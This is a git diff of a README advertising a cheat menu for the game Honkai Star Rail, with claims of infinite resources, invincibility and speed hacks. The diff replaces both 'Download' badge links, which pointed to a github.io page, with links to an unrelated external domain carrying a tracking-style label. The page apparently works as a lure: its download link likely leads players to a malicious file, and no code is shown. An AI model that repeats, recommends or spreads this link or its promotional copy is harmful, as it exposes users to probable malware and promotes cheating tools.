@@ -2,7 +2,7 @@
 
 The **Honkai Star Rail Cheat Menu** is the ultimate tool for players who want to enhance their gameplay experience and explore the full potential of Honkai Star Rail. Whether you're looking to gain an advantage in battles, unlock hidden content, or simply enjoy the game with customized settings, this cheat menu gives you the tools to take your experience to the next level. From infinite resources to unlocking rare items and characters, the Honkai Star Rail Cheat Menu offers a wide range of powerful features.
 
-[![Download HNK CheatMenu](https://img.shields.io/badge/Download-HNK%20CheatMenu-blueviolet)](https://honkai-star-rail-cheat-menu.github.io/.github/)
+[![Download HNK CheatMenu](https://img.shields.io/badge/Download-HNK%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## ⚡ Key Features
 
@@ -39,4 +39,4 @@ The **Honkai Star Rail Cheat Menu** is the ultimate tool for players who want to
 4. **Activate Desired Features**: Use the menu to unlock features like infinite resources, invincibility, speed hacks, and more.
 5. **Enjoy the Enhanced Experience**: With all the cheats enabled, dive deeper into the game and explore new possibilities without limitations.
 
-[![Download HNK CheatMenu](https://img.shields.io/badge/Download-HNK%20CheatMenu-blueviolet)](https://honkai-star-rail-cheat-menu.github.io/.github/)
+[![Download HNK CheatMenu](https://img.shields.io/badge/Download-HNK%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
